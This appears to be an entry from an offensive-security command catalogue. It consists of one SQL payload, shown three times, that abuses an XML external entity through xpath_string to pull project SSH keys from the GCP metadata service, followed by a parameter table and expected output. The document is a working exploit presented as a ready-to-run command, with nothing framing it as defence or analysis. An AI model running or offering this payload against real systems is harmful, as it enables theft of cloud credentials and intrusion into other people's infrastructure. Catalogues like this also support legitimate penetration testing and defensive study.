---
data: >-
  select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
  <!ENTITY xxe SYSTEM
  "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys">
  ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
tags:
  - xxe
  - ssrf
type: command
executor: sql
platforms:
  - GCP
id: ebec40d8-857b-4edc-a81a-d71fb860dc3f
created_at: '2025-12-13T09:00:27.757Z'
updated_at: '2025-12-13T09:00:27.757Z'
verified: false
validated: true
submitted: true
---
# select-xpath-string-ssh-keys

## Command

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## Description

Executes XXE to fetch SSH keys from GCP metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `SYSTEM` | Fetches from specified URI | Yes |
| `xpath_string` | Processes XML with XXE | Yes |

## Examples

### Basic Usage

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

## Expected Output

List of SSH keys (redacted)

## Related

- [[procedures/Exploit-XXE-for-GCP-Metadata]]
